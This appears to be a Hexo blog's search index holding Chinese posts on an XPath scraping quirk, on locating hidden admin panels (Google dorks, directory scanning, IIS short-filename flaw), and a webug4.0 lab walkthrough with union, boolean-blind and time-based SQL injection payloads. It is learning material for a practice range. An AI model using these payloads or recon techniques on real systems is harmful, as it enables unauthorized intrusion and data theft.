<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[xpath无法定位tbody标签]]></title>
    <url>%2F2019%2F04%2F15%2Fxpath-tbody%2F</url>
    <content type="text"><![CDATA[最近在写爬虫的时候，遇到一个坑，决定记录下来 如图所示，我想要爬取的数据都存在tbody下面的tr标签内 这是我写的xpath语句 1//table[@class=&quot;table topic-list&quot;]/tbody//tr 输出测试，结果显示为空？ 可是f12下查看数据包发送过程，发现关键数据也不是通过ajax传输的，那么继续测试 1//table[@class=&quot;table topic-list&quot;] 结果table标签能够定位到，那么问题就出在tbody标签上 1//table[@class=&quot;table topic-list&quot;]/tbody 果然是tbody的问题，那么试着跳过 1//table[@class=&quot;table topic-list&quot;]//tr 成了 上网找一下原因，结果是浏览器对html文本进行解析时会进行一定的规范化，所以自动加上了tbody标签 emmm,那么结论就是下次遇到类似情况，跳过就完事了]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>踩坑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集-找后台]]></title>
    <url>%2F2019%2F03%2F18%2Finformation-houtai%2F</url>
    <content type="text"><![CDATA[寻找后台的意义1.看是否存在弱口令漏洞，或者万能密码之类的注入漏洞 2.是否存在未授权访问后台漏洞 3.其他未知漏洞 常见方法 图片路径在寻找某个站的后台时，试了常规的方法并没有找到，这时随便打开一张图片，观察路径 网站/cms/js/ewebeditor/uploadfile/20180615215117229.JPG 这个时候尝试访问 网站/cms 成功访问 爬虫遍历awvs，burp的爬虫模块都能够对网站总体目录进行爬取，那么也许就能爬取到后台地址 字典扫一般就是御剑这样的工具配合字典去访问网站 google hack一般使用如下的google语法 1site:目标网站 inurl:admim 1site:目标网站 inurl:system 1site:目标网站 inurl:console 1site:目标网站 inurl:manage 1site:目标网站 inurl:login cms通用识别出网站是什么cms，就可能通过cms默认的路径去访问到后台，比如说dedecms的后台地址就是 网站/admin等 数据库log如果能够获取到目标网站的数据库log文件，那么就有可能通过记录看到后台位置 短文件漏洞漏洞成因 这篇博文已经说得很清楚了，附上链接 大佬文章 这里再附上这位大佬写的工具 github地址 之所以最后讲这种方法，因为这种方法存在缺陷，只能猜解前六位，以及扩展名的前3位，并且如果文件名称比较短的话是没有短文件名的]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webug4.0通关笔记-注入之sql注入]]></title>
    <url>%2F2019%2F03%2F17%2F1%2F</url>
    <content type="text"><![CDATA[webug 是什么WeBug名称定义为“我们的漏洞”靶场环境基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中。 本平台4.0为测试版本，主要分两大类1.练习阶段，适合新手朋友们去了解一些漏洞，在环境中也包括有一些逻辑漏洞。 2.本平台实战阶段内容均为网上存在漏洞的开源cms，可以很好地帮助新手朋友去对漏洞进行了解~ 3.自我感觉，webug4.0与其他靶场相比，突出了一个真实，适合了解一定漏洞原理，苦于无法实现的小白实现，比如说我。所以基础知识不会讲太多，主要是通关的思路。 来源：226安全团队 [官网]（http://www.webug.org) 靶场显错注入常规测试在单引号后面加上单引号’ 结果如下所示 ok，下面开始正戏 首先猜字段 继续尝试，当order by 3时，页面报错，所以可知字段数是2 并且只有第二个字段处内容可以显示在界面上，所以此处利用第二个字段获取想要的信息 首先获取数据库名 获取表名 payload 11&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;webug&apos;)--+ 获取flag表的字段数 payload 11&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;)--+ 获取flag值payload 11&apos; union select 1,flag from flag where id=1--+ 布尔注入继续常规测试，在id参数后加单引号，发现页面并没有报错，但是页面却有点变化 此处又尝试了双引号等，发现页面均正常显示，因此猜测id参数依然被单引号包裹，所以来验证一下 成了，因为此处页面并没有回显，也就是无法显示字段等内容，因此第一个靶场的union注入就无法使用，根据题目使用布尔注入。 测数据库长度 测数据库名 因此得出数据库的第一个字符 以此类推，可以推出数据库的名字 测表名 payload 11&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;webug&apos; limit 0,1),1,1))=108 --+ 这里的payload是为了测出webug下数据库，第一个表名的第一个字符，并且以ascii值为评判标准，之所以用ascii的形式是为了能用burp爆破，从而更加省事 这样我们就测出来了第一个表名的第一个字符是d，以此类推，改变limit n,1就可以测试出第n个表；改变substr(str,n,1)就可以测试某个表名第n个字符，这里不再演示，请读者自己尝试 测字段同猜测表名基本上是一样的步骤，直接上payload payload 11&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;flag&apos; limit 0,1),1,1))=105 --+ 获取flag同上面步骤 payload11&apos; and ascii(substr((select flag from flag where id=1),1,1))=68 --+ 延时注入首先发现第三关和第二关代码是一样的，不知道是不是设计失误，还是我没下载好，但是发现确实是有两个html文件于是便稍微修改了一下 首先常规测试，测试’,”,’),”)等特殊符号，发现页面均无变化，结合题目的延时注入，分别测试如下payload 1”) and sleep(1)–+1’) and sleep(1)–+1) and sleep(1)–+1” and sleep(1)–+1’ and sleep(1)–+ 此时页面有明显延迟 所以判断出注入点，且注入点是被单引号包围的 其实之后的思路与上面两个靶场大同小异，只不过使用的方法以及函数有所不同 测数据库长度payload11&apos;and If(ascii(length(database()))=115,1,sleep(5))--+ 测数据库名11&apos;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 以此类推 测表名payload11&apos;and If(ascii(substr((select table_name from information_schema.tables where table_schema=&apos;webug&apos; limit 0,1),1,1))=115,1,sleep(5))--+ 测字段payload11&apos;and If(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;flag&apos; limit 0,1),1,1))=115,1,sleep(5))--+ 获取flag8写了，自己懂的]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶机练习</tag>
        <tag>webug</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F02%2F12%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
